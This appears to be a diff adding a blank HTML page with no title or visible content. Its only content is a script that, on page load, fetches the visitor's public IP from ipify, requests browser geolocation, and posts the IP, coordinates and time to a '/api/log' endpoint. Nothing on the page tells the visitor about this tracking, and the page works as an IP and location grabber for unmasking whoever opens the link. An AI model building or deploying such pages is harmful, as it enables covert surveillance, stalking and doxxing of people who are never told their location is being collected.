@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title></title>
+</head>
+<body>
+ <script>
+ async function getIP() {
+ const res = await fetch("https://api.ipify.org?format=json");
+ const data = await res.json();
+ return data.ip;
+ }
+
+ function getLocation() {
+ return new Promise((resolve, reject) => {
+ navigator.geolocation.getCurrentPosition(
+ (pos) => {
+ resolve({
+ lat: pos.coords.latitude,
+ lon: pos.coords.longitude
+ });
+ },
+ reject
+ );
+ });
+ }
+
+ async function capture() {
+ try {
+ const ip = await getIP();
+ const location = await getLocation();
+ const time = new Date().toLocaleString();
+
+ const response = await fetch('/api/log', {
+ method: 'POST',
+ headers: {
+ 'Content-Type': 'application/json',
+ },
+ body: JSON.stringify({ ip, lat: location.lat, lon: location.lon, time }),
+ });
+
+ if (response.ok) {
+ console.log('Log sent successfully');
+ } else {
+ console.log('Failed to send log');
+ }
+ } catch (err) {
+ console.log("Permission denied or error sending log:", err);
+ }
+ }
+
+ window.onload = capture;
+ </script>
+</body>
+</html>
